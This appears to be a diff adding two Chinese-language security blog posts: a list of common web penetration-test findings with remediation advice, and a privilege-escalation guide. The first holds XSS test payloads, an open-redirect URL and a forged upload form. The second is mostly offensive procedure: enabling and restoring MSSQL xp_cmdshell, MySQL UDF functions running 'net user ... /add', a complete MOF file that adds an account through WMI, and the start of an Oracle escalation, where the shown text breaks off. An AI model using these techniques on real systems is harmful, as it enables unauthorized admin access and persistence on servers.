@@ -65,6 +65,484 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-yewuluoji" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/04/18/yewuluoji/" class="article-date">
+  <time datetime="2016-04-18T06:53:37.000Z" itemprop="datePublished">2016-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/04/18/yewuluoji/">渗透项目常见漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>##渗透项目常见漏洞<br><strong>1、业务逻辑漏洞：</strong><br>突破限制：如果只有有限个选择，那么就看能否在抓包之后修改继续往下走，比如金额，<br>–安全建议：<br> 服务器端对输入之后立即验证。</p>
+<p>短信、邮件炸弹：在需要验证的地方，首先看手机号和邮箱号是否可修改，然后抓包重放，<br>–安全建议：<br> 1.服务器端控制发送验证码的频率和时间。<br> 2、从数据库中查询用户的银行预留手机号码或邮箱，再验证发送。而不是获取之后返回给用户界面再由用户提交该请求。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">http 方法测试：</span><br><span class="line">options、head、get、post、<span class="keyword">delete</span>、trace 方法。</span><br><span class="line"><span class="number">1.</span>options 方法：</span><br><span class="line">NC 连接 <span class="number">80</span> 端口，输入: options / http/<span class="number">1.1</span></span><br><span class="line"><span class="number">2.</span>head 方法:</span><br><span class="line">NC 连接 <span class="number">80</span> 端口，输入：head / http/<span class="number">1.1</span></span><br><span class="line"><span class="number">3.</span>get 方法：</span><br><span class="line">NC 连接 <span class="number">80</span> 端口，输入：get webview HTTP/<span class="number">1.0</span></span><br><span class="line"><span class="number">4.</span>使用 burp 向目标主机发包：</span><br><span class="line">options http:<span class="comment">//www.<span class="label">xxx.com HTTP/1.1</span></span></span><br><span class="line">Host: www.xxx.com</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36</span><br><span class="line">Content-Length: 2</span></span><br></pre></td></tr></table></figure>
+<p>–安全建议：</p>
+<p> 禁用 OPTIONS、TRACE 方法。</p>
+<p>HttpOnly:<br>主要是为了限制 web 页面程序的 browser 端 script 序读取 cookie，防止恶意代码获取客户的敏感信息。可防止 XSS。<br>打开浏览器开发者工具在数据包中 cookie 栏可见。<br>–安全建议：</p>
+<p> 修改源代码设置 httponly 属性。</p>
+<p>SETCOOKIE 配置 SECURE:</p>
+<p>Cookie 只能在 HTTPS 连接中被浏览器传递到服务器端进行会话验证，如果是 HTTP 连接则不会传递该信息，所以绝对不会被窃听到，可以防止 cookie 泄露。<br>–安全建议：</p>
+<p> 修改源代码设置 secure 属性。</p>
+<p>图形验证码测试：<br>1.是否有干扰指纹，<br>2.验证码是否只能使用一次，账号密码出错、页面跳转之后是否变换验证码。<br>本地 js 验证可绕过。<br>–安全建议：</p>
+<p> 加大字符扭曲化效果，避免使用单色背景，添加干扰指纹， 验证码只使用一次；服务器随机生成。</p>
+<p>安全退出：<br>点击安全退出后，再点击浏览器 返回 按钮，再点击其他链接，看是否需要重新登录。<br>–安全建议：</p>
+<p> 销毁会话。退出同时清除认证信息，确保用户安全退出</p>
+<p><strong>越权：</strong><br>1.水平越权：<br>一般在有编号，订单号，账号，邮箱号，手机号等等地方，修改其号码为其他用户号码，看是否以号码为参数进行查询，从而验证水平越权，<br>–安全建议：</p>
+<p>   1.通过会话信息在服务器端确认操作人的身份来控制。<br>   2.建议数据传输时，先做加密处理。<br>   3.提交的数据做特殊处理<br>   4.最小权限原则，A 用户只拥有 A 的资料信息。<br>    5.从服务器数据库中读取信息，而不是通过用户输入。</p>
+<p>2.垂直越权：<br>低权限账户虽然没有高权限账户的处理模块，但是可以访问高权限账户的 URL，低权限账户可以构造高权限请求发包完成操作。<br>–安全建议：</p>
+<p> 服务器响应客户端请求时，先认证身份，然后检查访问权限对相关页面进行访问权限控制和操作控制</p>
+<p>明文传输：<br>抓包，查看关键信息是否加密，<br>–安全建议：</p>
+<p> 加密敏感信息。</p>
+<p>信息泄露：<br>错误请求，可能会爆出一些错误，这些信息中可能会有一些敏感信息，<br>敏感信息数据包中泄露，<br>安全建议：</p>
+<p> 所有错误请求跳转到自定义错误页面，屏蔽服务器自身错误页面返回的信息，禁止返回 banner 信息，配置 web 服务器，IIS 可通过ServerMask 修改头部信息。<br> 服务器端增加容错机制，对异常进行捕获以及规避常规错误。<br> 加密敏感数据。<br> 修改数据库查询语句，限定查询结果。<br>  修改程序返回信息，限定服务器结果输出内容。<br>  限制信息接口调用，限制用户对程序接口调用获取信息。</p>
+<p>CSRF：<br>–安全建议：</p>
+<p> 判断请求 refer，<br> 关键操作时需要验证，<br>  在请求地址中增加 token 并验证，并且不要将所有认证信息放置在 cookie 中。</p>
+<p>XSS：<br>反射型：<br>测试代码：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&lt;<span class="function"><span class="title">scriptalert</span><span class="params">(/xss/)</span></span>&lt;/script&lt;script</span><br><span class="line">&lt;/script&lt;<span class="tag">iframe</span> src=javascript:<span class="function"><span class="title">alert</span><span class="params">(/xss/)</span></span></span><br><span class="line">aaa”&lt;<span class="function"><span class="title">scriptalert</span><span class="params">(/xss/)</span></span>&lt;/script <span class="hexcolor">#aaa</span> 为 get 参数。</span><br><span class="line">aaa”&lt;<span class="function"><span class="title">scriptalert</span><span class="params">(/xss/)</span></span>&lt;/script</span><br><span class="line">aaa” onmouseover=<span class="function"><span class="title">alert</span><span class="params">(/xss/)</span></span> bad=”</span><br><span class="line">“‘&lt;<span class="tag">img</span> src=<span class="number">1</span> onerror=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span>”&lt;body/onload=<span class="function"><span class="title">alert</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>–安全建议：</p>
+<p> 1：网络防火墙 WAF 产品，可以防止带有恶意参数的交互，防止跨站脚本攻击。<br>  2：修改网站源代码，对用户输入过滤对输入进行 HTML 编码。 URL 结尾禁止添加脚本语句并限制输入位置的字符串长度 URL 过滤相应关键字，例如： &lt;、script、alert、document、cookie 编写 filter过滤相关特殊字符，限制提交跨站语句对于客户端提交的数据，再次向客户端输出之前需要进行处理。如果确认客户端只允许提交文本，则应对文本进行HTMLEncode 之后输出；如果确认客户端允许输入富文本，则应对一些危险的 Javascript 脚本、HTML 元素进行过滤后输出。</p>
+<p>SessionID：<br>以 get 方式向服务器发送请求，<br>–安全建议：</p>
+<p> 采用 post 方式请求，服务器控制保证每个用户同时只存在一个会话。</p>
+<p>会话管理不严谨：<br>不安全的直接对象引用，或 会话过期时间可抓包修改。<br>–安全建议：</p>
+<p> 对存在问题的参数使用间接对象引用，结合用户的登录状态及权限；<br> 服务器端控制会话过期时间。</p>
+<p>会话固定：<br>登录前后 sessionid 不变；<br>–安全建议：</p>
+<p> 修改登录部分代码，登录成功后生成新的会话传递认证信息。</p>
+<p>敏感信息可修改：<br>在转账等等时候，填入账户抓包后可修改收款人账号。<br>–安全建议：</p>
+<p> 1.建议数据传输时，先做加密处理；<br> 2.提交的数据做特殊处理；</p>
+<p>暴力破解：<br>–安全建议：</p>
+<p> 1.任何拥有用户登录功能的页面都需要使用图型验证码；<br> 2.设置登录失败多少次后进行帐户锁定；<br> 3.设置密码要求密码复杂度。</p>
+<p>验证码超时可用：<br>用已超时的验证码验证，如果可用即存在验证码爆破。<br>–安全建议：</p>
+<p> 1：超时后强制使验证码失效。<br> 2：添加图型验证码，以防止暴力破解。</p>
+<p>登录：<br>用户名不正确提示用户名不存在，用户名正确密码错误提示密码不匹配，有可能提示是”用户名或密码错误”，但是如果发包的返回结果可能会不一样，更细致的检测需要通过前段发包来看回显。<br>–安全建议：</p>
+<p> 均提示用户名或密码错误，发包也提示一样的错误。</p>
+<p>嵌入页面钓鱼攻击：<br>在一些链接中，提交代码，伪造某一网站，进行嵌入页面钓鱼攻击。<br>–waf 设备，过滤提交数据。</p>
+<p>URL 重定向：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/logout?service=http:<span class="comment">//www.hack.com</span></span><br></pre></td></tr></table></figure>
+<p>–安全建议：</p>
+<p> 修复程序存在问题的参数，限制页面跳转功能；<br> 若 returnURL 不属于本站点范围内，则立即跳转至统一错误页面。</p>
+<p>第三方编辑器：<br>fckeditor==。<br>–安全建议：</p>
+<p> 建议采用自制开发的编辑器或者对此页面进行访问控制。</p>
+<p>权限回收：<br>在低权限用户登录状态下，权限被收回，依然可执行权限。<br>–安全建议：</p>
+<p> 对用户的登陆状态进行实时处理。</p>
+<p>金额负数：<br>–安全建议：</p>
+<p> 验证数据，强制正数。</p>
+<p>负数汇款出现错误，但是增加了日限额。<br>–安全建议：</p>
+<p> 时刻检查金额，不符合立马操作错误并终止后续操作。</p>
+<p>配置文件泄露：<br>–安全建议：</p>
+<p> 将 xml 等配置文件放在非 Web 访问目录，或将相关敏感文件存放入 /WEB-INF/ 目录，这个目录受 servlet<br> 容器保护，可以避免被浏览器直接访问，或者实现一个 Filter，拦截对 /xml 目录的 http 请求。</p>
+<p>加密参数可修改为明文：<br>部分提交数据经过了加密，但是修改为明文值提交也能通过。<br>安全建议：</p>
+<p> 通过会话信息在服务器端确认操作人的身份，服务器端对提交数据格式进行校验。</p>
+<p>密码修改：<br>可构造数据包，直接替换账户密码修改任意用户口令。<br>–安全建议：</p>
+<p> 禁止危险 http 方法，修改口令同时提交短息验证信息。</p>
+<p>短息验证码绕过：<br>乱输短息验证码，返回验证码错误，删除响应包体，即可能绕过。<br>–安全建议：</p>
+<p> 在服务器端对提交的数据进行验证合法性。</p>
+<p>上传：<br>–安全建议：</p>
+<p> 1、同时在客户端和服务端对上传文件类型进行限制,白名单 ==，禁止脚本文件上传。<br> 2、对上传文件进行改名、转码，或上传至单独文件服务器，阻止脚本文件解析执行。<br> 3、并对存储上传文件的目录设置权限，去掉解析权限。</p>
+<p>IIS 短文件和文件名泄露：<br>验证： <code>http://target.com/a*~1*/.aspx</code><br>–安全建议：</p>
+<p> 1.关闭 windows 的 8.3 短文件名功能，或对 404 以及 400 页面进行统一处理。<br> 2.过滤输入提交数据中的 ~ 符号。<br> 3.如果 web 环境不需要 asp.net 的支持，进入 Internet 信息服务(IIS)管理器 — Web 服务扩展 – ASP.NET 选择禁止此功能。<br> 4.升级 net framework 至 4.0 以上版本。</p>
+<p>允许关键字为空的全文检索：<br>由于网站全文检索功能需要调用较多的资源进行数据库查询，因此允许关键字为空的全文检索功能可能会导致基于查询性能的拒绝服务攻击（如 CC 攻击）。<br>–安全建议：</p>
+<p> 在服务器端检查搜索输入提交值。</p>
+<p>httpoOnly 信息泄露：<br>如果用户发送大于 4K 的 cookie 时，系统会返回一个错误，并且把所有的 cookie 完整的在页面中显示出来。<br>–升级 Apache 版本。</p>
+<p>慢 DDoS 攻击：<br>原因：web sever 未限制 HTTP 头部传输的最大许可时间。<br>–安全建议：</p>
+<p> 根据 web 服务器性能和带宽流量，以及业务的访问数量，调整 web 中间件配置文件的 timeout 等参数，或者使用专业的抗 ddos 设备来进行防护。<br> 建议通过 web 中间件限制单个 IP 的最大连接数在合理的数值内。 在 apache 服务器上添加 mod_antiloris 模块等方法缓解 Dos 慢速攻击。</p>
+<p>路径、目录遍历：<br>–安全建议：</p>
+<p> 将 Web 服务器配置成拒绝列出目录并删除无用的目录。</p>
+<p>后台泄露：<br>直接 IP + 端口访问后台： xx.xx.xx.xx:8080 到后台。<br>–安全建议：</p>
+<p> 隐藏此设备后台地址，或者禁止外网 IP 访问。</p>
+<p>.svn 泄露：<br>–安全建议：</p>
+<p> 建议删除 svn 同步产生的日志文件即可。</p>
+<p>任意文件下载：<br>–安全建议：</p>
+<p> 对 download.jsp/asp/php 进行源代码审计然后修改函数，限制路径权限，参数不直接传文件名。</p>
+<p>构造文件上传：<br>发现有第三方应用(ueditor/fckeditor==)有可用的上传接口(–/ueditor/fileup.jsp)，本地构造上传表单：</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html</span><br><span class="line">&lt;title</span><br><span class="line">New <span class="keyword">file</span> upload</span><br><span class="line">&lt;/title</span><br><span class="line">&lt;body </span><br><span class="line">&lt;<span class="keyword">form</span> <span class="keyword">action</span> =”http://<span class="type">target</span>.com/ueditor/jsp/fileUp.jsp” method=”post” <span class="keyword">name</span>=”<span class="keyword">form</span>” enctype=”multipart/<span class="keyword">form</span>-<span class="type">data</span>”</span><br><span class="line">Upload <span class="keyword">file</span>:&lt;br/</span><br><span class="line">&lt;input <span class="keyword">name</span>=”NewFile” <span class="keyword">type</span>=”<span class="keyword">FILE</span>” </span><br><span class="line">&lt;input <span class="keyword">type</span>=”submit” <span class="keyword">name</span>=”Submit” <span class="keyword">value</span>=”上传” </span><br><span class="line">&lt;/<span class="keyword">form</span></span><br><span class="line">&lt;/body</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure>
+<p>本地保存为 D://upload.html 本地访问：file:///D://upload.html 可上传文件。<br>–安全建议：</p>
+<p> 对上传功能进行安全加固，对文件格式、内容进行严格校验。</p>
+<p>失效的身份认证和会话管理：<br>Cookie 的前后台管理缺陷。<br>后台、前台在同一个浏览器里相继登录导致 JSESSIONID 被冲掉的一个全过程如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、打开 chrome，打开后台页面，此时 JSESSIONID=</span><br><span class="line">后台初始</span><br><span class="line"><span class="number">71</span>DF533CBF1C4F391B7E0A66807E48E5<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">2</span>、登录 super 用户之后，JSESSIONID 变为</span><br><span class="line">后台合法</span><br><span class="line"><span class="number">357</span>AA84909574CD534F98A680A3880AC<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">3</span>、同一个浏览器内打开前台系统，JSESSIONID 为</span><br><span class="line">前台继承</span><br><span class="line"><span class="number">357</span>AA84909574CD534F98A680A3880AC<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">4</span>、登录前台系统，此时前台系统变为</span><br><span class="line">前台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">5</span>、回到后台标签，F12 重新打开，发现已被冲掉</span><br><span class="line">后台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">6</span>、使用后台用户查询，发现使用的是非法 cookie</span><br><span class="line">后台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line"><span class="number">7</span>、禁用某后台用户，发现使用的仍是非法 cookie</span><br><span class="line">后台</span><br><span class="line">AFA5C7749875646749FCA10725DAA240<span class="class">.B2BServer112</span></span><br><span class="line">最终导致后台用户使用非法的 JSESSIONID 做了合法操作的事情。</span><br></pre></td></tr></table></figure>
+<p>与 XSS 结合利用。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2016/04/18/yewuluoji/" data-id="cin5p3mj90003f8fwgx5vsyod" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-tiquan" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/04/18/tiquan/" class="article-date">
+  <time datetime="2016-04-18T06:53:24.000Z" itemprop="datePublished">2016-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/04/18/tiquan/">系统提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>提权的方法有很多，服务器上开启的某些服务也能成为提权的途径，当然提权方法多种多样，我见得少，这里就简单介绍一下平民化的几种提权方式：系统提权 + 数据库提权 + DLL 劫持。</p>
+<h4 id="u7CFB_u7EDF_u6F0F_u6D1E_u63D0_u6743_uFF1A"><a href="#u7CFB_u7EDF_u6F0F_u6D1E_u63D0_u6743_uFF1A" class="headerlink" title="系统漏洞提权："></a>系统漏洞提权：</h4><p>系统漏洞提权一般就是利用系统自身缺陷，使用 shellcode 来提升权限。Windows 和 Linux 系统均有提权用的可执行文件。<br>Windows exp 一般格式为 MS08067.exe。<br>Linux exp 一般格式为 2.6.18-194 或 2.6.18.c(需要编译)。</p>
+<h5 id="Windows__u63D0_u6743_uFF1A"><a href="#Windows__u63D0_u6743_uFF1A" class="headerlink" title="Windows 提权："></a>Windows 提权：</h5><p>方法：<br>1.使用 systeminfo 命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的 exp 进行提权。<br>2.找可写目录，上传 cmd.exe、提权 exp 等工具。<br>3.使用 exp 进行提权，加账号等操作。</p>
+<p>Tips：<br>渗透过程中经常会遇到管理员禁止了 cmd.exe 的使用，我们该怎么办？禁止了 .exe 文件的上传怎么办？<br>传一个 cmd.exe 上去，任意扩展名(webshell 下运行不管后缀名是什么都会以 .exe 文件运行)。<br>管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br>追加符保存到 txt。<br>在使用 webshell 提权的时候要特别注意：</p>
+<ol>
+<li>asp 的 webshell 要支持：wscript(wscript.shell/shell.application)，没组件执行不了 cmd。</li>
+<li>aspx 能调用 .net 组件来执行 cmd 的命令。</li>
+</ol>
+<h5 id="Linux__u63D0_u6743_3A"><a href="#Linux__u63D0_u6743_3A" class="headerlink" title="Linux 提权:"></a>Linux 提权:</h5><p>形如 2.6.18.c，需要编译后运行，提权。<br>提权 exp 使用方法：<br>1.使用 uname -a 命令或者 cat /proc/version，来判断系统的内核情况等等，然后使用相对应的 exp 进行提权。<br>2.使 exp 执行即可，一般情况下 Linux 的本地提权要用 nc 反弹出来，因为 Linux 下提升权限后得到的是交互式 shell，需反弹才能进行下一步命令的执行。<br>Tips：<br>1.提权过程中需要为你的提权 exp 赋权，chmod。<br>2.Linux 服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般 /tmp/ 目录不会被设置权限。<br>数据库提权：<br>数据库提权就是利用执行数据库语句、利用数据库函数、扩展存储过程等方式提升服务器用户的权限。<br>数据库提权首先通常需要能登录数据库，所以通常我们拿到 webshell 之后要去网站目录去找数据库连接文件，常在形如 xxx.conf 或 conf.xxx 文件中。</p>
+<h4 id="MSSQL__u63D0_u6743_uFF1A"><a href="#MSSQL__u63D0_u6743_uFF1A" class="headerlink" title="MSSQL 提权："></a>MSSQL 提权：</h4><p>原理：<br>SQL Server 提权是利用扩展存储过程来执行系统命令，达到使自己权限提升的目的。<br>SQL Server 的提权一般是调用 xp_cmdshell 函数来提权。</p>
+<p>适用环境：<br>1.SQL Server 的服务没有降权,是以默认服务继承的权限来运行的；<br>2.拥有该主机 SQL Server 中的 sa 或管理员的账号和密码。</p>
+<p>方法：<br>1.获取当前数据库的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息；<br>2.连接数据库：</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server=localhost;UID=<span class="keyword">sa</span>;<span class="keyword">PWD</span>=<span class="keyword">sa</span>;database=XXXX;Provider=SQLOLEDB</span><br></pre></td></tr></table></figure>
+<p>3.执行 cmd 命令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master<span class="class">.dbo</span><span class="class">.xp_cmdshell</span> ‘whoami’</span><br></pre></td></tr></table></figure>
+<p>可用来提权的存储过程：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sp_makewebtask</span></span><br><span class="line">xp_cmdshell</span><br><span class="line">xp_dirtree</span><br><span class="line">xp_fileexist</span><br><span class="line">xp_terminate_process</span><br><span class="line">sp_oamethod</span><br><span class="line">sp_oacreate</span><br><span class="line">xp_regaddmultistring</span><br><span class="line">xp_regdeletekey</span><br><span class="line">xp_regdeletevalue</span><br><span class="line">xp_regenumkeys</span><br><span class="line">xp_regenumvalues</span><br><span class="line">sp_add_job</span><br><span class="line">sp_addtask</span><br><span class="line">xp_regread</span><br><span class="line">xp_regwrite</span><br><span class="line">xp_readwebtask</span><br><span class="line">xp_makewebtask</span><br><span class="line">xp_regremovemultistring</span><br></pre></td></tr></table></figure>
+<p>怎么恢复被删除的存储过程：<br>选择 add xp_cmdshell 扩展存储过程执行语句：<br>1.恢复 xp_cmdshell(sp_addextendedproc,xplog70.dll 未被删除)：sp_addextendedproc ‘xp_cmdshell’,’xplog70.dll’–<br>2.恢复 xp_cmdshell(xplog70.dll 被删)：<br>上传 xplog70.dll<br>执行 sp_addextendedproc ‘xp_cmdshell’,’c:\xplog70.dll’–<br>3.恢复 xp_cmdshell(sp_addextendedproc 被删)：dbcc addextendedproc(“xp_cmdshell”,”xplog70.dll”);</p>
+<p>怎么开启cmd_shell：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure ‘show advanced options’, 1<span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br><span class="line">EXEC sp_configure ‘xp_cmdshell’, 1<span class="comment">;</span></span><br><span class="line">RECONFIGURE<span class="comment">;</span></span><br></pre></td></tr></table></figure>
+<h4 id="MySQL__u63D0_u6743_uFF1A"><a href="#MySQL__u63D0_u6743_uFF1A" class="headerlink" title="MySQL 提权："></a>MySQL 提权：</h4><p>UDF 提权：<br>UDF (用户定义函数)是一类对 MySQL 服务器功能进行扩充的代码，通常使用 C/C++ 编写。<br>通过添加新函数并使用，性质就像使用本地 MySQL 函数 abs() 或 concat()。<br>UDF 也是在拥有低权限 MySQL 账号时比较好用的一种提权方法。</p>
+<p>原理：<br>通过添加自定义函数执行 cmd 命令。</p>
+<p>适用环境：<br>1.目标主机系统是 Windows（Win2000、XP、Win2003）<br>2.拥有该主机 MySQL 中的某个用户账号，该账号需要有对 MySQL 的 INSERT 和 DELETE 权限。<br>3.最好 MySQL 是默认启动的权限（system）。<br>Linux 下 MySQL 通常以 mysql 启动。</p>
+<p>方法：<br>1、获取当前 MySQL 的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息；<br>2、上传 UDF 提权用的 DLL，并进行数据库连接；<br>3、连接成功后，将自己的 DLL 导出到系统目录下的 DLL 文件；<br>4、使用 SQL 语句创建自定义函数执行 DLL；<br>5、通过 SQL 语句调用创建的函数执行命令；<br>6、删除函数和 DLL（必须先删函数再删 DLL）。</p>
+<p>导出路径：<br>需要导出 DLL 到插件路径，例如 D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin。</p>
+<p>创建自定义函数：<br>create function 函数名 returns string soname ‘导出的DLL路径’;<br>e.g:<br>create function cmdshell returns string soname ‘udf.dll’;<br>如果提示 Function ‘cmdshell’ already exists ，<br>则删掉原来的函数：drop function cmdshell; 再创建。</p>
+<p>调用创建的函数：<br>select 创建的函数名 (‘参数列表’);<br>e.g:<br>select cmdshell(“net user username password /add”);</p>
+<p>删除函数：<br>drop function 创建的函数名;<br>e.g:<br>drop function cmdshell;</p>
+<p>MOF 提权：<br>原理：这个我也不太是很明白，只知道这个 MOF 文件可以编译为可执行文件。</p>
+<p>方法：<br>1、找一个可写目录上传 mof 文件， 设上传到 C:/wmpub/nullevt.mof， 代码如下：</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma namespace(“\\\\.\\root\\subscription”)</span><span class="instruction"></span><br><span class="line">instance </span>of __EventFilter as $EventFilter&#123;</span><br><span class="line">EventNamespace = “Root\\Cim<span class="variable">v2</span>”;</span><br><span class="line">Name = “filtP2”;</span><br><span class="line">Query = “Select * From __InstanceModificationEvent ”</span><br><span class="line">“Where TargetInstance Isa \”Win32_LocalTime\” ”</span><br><span class="line">“And TargetInstance.Second = 5”;</span><br><span class="line">Query<span class="class">Language = “WQL”;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="instruction"></span><br><span class="line">instance </span>of ActiveScriptEventConsumer as $Consumer&#123;</span><br><span class="line">Name = “consPCSV2”;</span><br><span class="line">ScriptingEngine = “JScript”;</span><br><span class="line">ScriptText =”var WSH =<span class="instruction"> new </span>ActiveXObject(\”WScript.Shell\”<span class="function">)</span>\nWSH.run(\”net.exe user xxx xxx /add\”<span class="function">)</span>”;//自行修改。</span><br><span class="line">&#125;;</span><br><span class="line"><span class="instruction"></span><br><span class="line">instance </span>of __FilterToConsumerBinding&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>2、执行 load_file 及 into dumpfile 把文件导出到正确的位置：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span> <span class="keyword">load_file</span>(‘<span class="keyword">C</span>:/wmpub/nullevt.mof’) <span class="keyword">into</span> <span class="keyword">dumpfile</span> ‘<span class="keyword">c</span>:/windows/system32/wbem/mof/nullevt.mof’</span></span><br></pre></td></tr></table></figure>
+<p>3.执行成功后，可修改 MOF 文件中的代码执行其他命令。</p>
+<h4 id="Oracle__u63D0_u6743_uFF1A"><a href="#Oracle__u63D0_u6743_uFF1A" class="headerlink" title="Oracle 提权："></a>Oracle 提权：</h4><p>方法 1：<br>原理：oracle 的提权就是利用的 oracle 的扩展，自定义执行命令的功能进行提权，只不过 oracle 是用 java 脚本来扩展。</p>
+<p>步骤：<br>1.利用已知的 Oracle 用户名连上数据库，并创建 java 提权函数。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:/WINDOWS/system32&gt;sqlplus /nolog</span><br><span class="line">SQL*Plus: Release <span class="number">9.2</span><span class="number">.0</span><span class="number">.1</span><span class="number">.0</span> – Production on 星期日 <span class="number">8</span>月 <span class="number">31</span> <span class="number">14</span>:<span class="number">01</span>:<span class="number">43</span> <span class="number">2008</span></span><br><span class="line">Copyright (c) <span class="number">1982</span>, <span class="number">2002</span>, Oracle Corporation. All rights reserved.</span><br><span class="line">SQL&gt; conn ysreal/ysreal@(description=(address_list=(address=(protocol=tcp)(host=</span><br><span class="line"><span class="number">10.100</span><span class="number">.0</span><span class="number">.239</span>)(port=<span class="number">1521</span>)))(connect_data=(SERVICE_NAME=WORK)));</span><br></pre></td></tr></table></figure>
+<p>已连接。</p>
